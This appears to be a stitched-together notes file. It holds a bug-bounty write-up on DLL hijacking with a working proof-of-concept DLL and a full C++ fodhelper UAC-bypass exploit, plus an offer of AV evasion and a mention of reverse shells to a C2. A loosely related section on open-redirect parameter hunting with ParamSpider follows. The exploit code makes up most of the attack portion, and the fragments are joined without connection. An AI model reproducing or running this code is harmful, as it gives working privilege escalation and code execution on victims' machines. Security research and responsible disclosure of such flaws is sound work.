Path => contains => .dll => then include (click add)

(include only process name appnamehere.exe)

Process Name => is => appnamehere.exe => then include (click add)

(include only process name appnamehere.exe)

Process Name => is => appnamehere.exe => then include (click add)

(filter those dlls that the executable is trying to load but it is missing)  
Result => is => NAME NOT FOUND => then include (click add)

Now click on Apply and then press OK

3. Now double click on the appnamehere windows executable (from main location or from desktop shortcut anything)  
4. Wait for the tool to monitor all missing dlls  
5. Observe the missing dll profapi.dll

```
D:\binarytest\appnamehere\profapi.dll
```

Note: The location may be different depending on where appnamehere.exe got installed while the initial downloading of this application

## 📗Phase2 Steps

1.Install microsoft visual studio IDE for .NET and C++ developers on windows at the website [https://visualstudio.microsoft.com/](https://visualstudio.microsoft.com/)  
(There are 2 visual studio, please install the correct one — purple)😂

2.Create a new project  
3.Select the following template  
(Dynamic-Link Library — DLL) : build a .dll that can be shared between multiple running windows apps.

4.Save the project name as profapi (dont write extension here) and save the project in any location.  
5.Copy paste the following cpp code

```c++
#include "pch.h"  
#include <windows.h>  
  
int maliciousTestDll()  
	{  
WinExec("calc", 0);  
return 0;  
	}  
  
BOOL APIENTRY DllMain( HMODULE hModule,  
					DWORD ul_reason_for_call,  
					LPVOID lpReserved  
					)  
	{  
maliciousTestDll();  
return 0;  
	}
```

For basic POC level, there is nothing malicious inside the function maliciousTestDll , just to open calculator, in real world steal and hijack everything from the victim’s device.

6.In visual studio go to the tab  
Build => Configuration Manager => select architecture as x64

7.Now Build => Build Solution  
8.Observe the output where the dll got stored  
9.Copy that profapi.dll and paste in the following location:


```
D:\binarytest\appnamehere\
```

Note: The location may be different depending on where appname.exe got installed while the initial downloading of this application

10.Now execute the application appname.exe , when it runs it will try to load our malicious profapi.dll in which we programmed to launch calculator application and after 10–15 seconds , we will be able to see the legitimate application

>> If it doesn’t work, go back and change architecture to 32-bit and try again.
>
>## 📙Phase3 (Privilege Escalation)

[It may or may not lead to escalation, or maybe I am missing something, modify according to your knowledge please]

As I said any code can be executed, it might be escalated to popup a administrator command prompt or a reverse shell administration command prompt to attacker’s C2 server in the real world exploits.

Below is a simple privilege escalation exploit for POC:

```c++
#include "pch.h"
#include <windows.h>
#include <iostream>

void uacbypass() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        const wchar_t* cmd = L"cmd.exe";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (wcslen(cmd) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        OutputDebugStringW(L"Registry key created and value set successfully.\n");
    }
    else {
        OutputDebugStringW(L"Error creating registry key.\n");
        return;
    }

    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        const wchar_t* delegateExecute = L"";
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)delegateExecute, (wcslen(delegateExecute) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        OutputDebugStringW(L"DelegateExecute value set successfully.\n");
    }
    else {
        OutputDebugStringW(L"Error setting DelegateExecute value.\n");
        return;
    }

    if (_wsystem(L"fodhelper") == 0) {
        OutputDebugStringW(L"fodhelper executed successfully.\n");
    }
    else {
        OutputDebugStringW(L"Error executing fodhelper.\n");
        return;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        uacbypass();
    }
    return TRUE;
}

```


![](https://miro.medium.com/v2/resize:fit:679/1*1i-qJ62MvHAWE7mWEXoK1Q.png)


### To add in your report:

🖋️Note to Team: If you want, I can add multi-layers of obfuscation and AV evasion stuff. But it will take several months for it. This is for demo and poc, showcasing it might be possible to gain access to normal or privileged user command prompt (system32) because of your executable, so post-exploitation on victim’s system by threat actors because of your application.

_by the author:_

In total , I tested approx 30+ windows executable binaries along with the self hosted ones. Here goes the results of it:

> **Bugcrowd**

![](https://miro.medium.com/v2/resize:fit:613/1*iJjdVfmbTExJpqL6e3UuFw.png)

> **HackerOne**

![](https://miro.medium.com/v2/resize:fit:445/1*h8EaDMdn3kTvdSqpqKk6AA.png)

> **HackenProof**

![](https://miro.medium.com/v2/resize:fit:875/1*EnFVuQQ5T8yZflVIDLbkxg.png)

> **WazirX Self hosted program**

![](https://miro.medium.com/v2/resize:fit:866/1*UaulvOlQDDzgCXvzhv9YXw.png)

> **Self hosted Private Company**

Can’t share the exact details due to non-disclosure and violation agreements, but you get the idea of this vulnerability which many programs say we can’t fix this, it’s a feature not a bug, others give bounty as a low impact vulnerability.

![](https://miro.medium.com/v2/resize:fit:875/1*jkvyXnILz5E60yZS3a_G3A.png)

![](https://miro.medium.com/v2/resize:fit:875/1*m-g7tR2QYMSDui6w2CCqCA.png)




---- da fare..

https://medium.com/@xNEED/dll-hijacking-msmpeng-00122fff9faf

---

# CORS: Automate Hunting for Open Redirect

### ParamSpider

_after collecting the urls_


```shell
grep -Ei 'url=|next=|redirect=|return=|rurl=|go=|dest=|out=' waybacksubdomain.txt > redirect.txt
```

OR

we will start by gathering the Parameter URLs related to the target by using the ParamSpider.

> You can install it : https://github.com/devanshbatham/ParamSpider

> To do this we will use the following command :

```
paramspider -l subdomain.txt > paramspiderout.txt  
```

Then you can extract the url with redirect parameters :

```shell
grep -Ei 'url=|next=|redirect=|return=|rurl=|go=|dest=|out=' nasaall > redirect_params.txt
```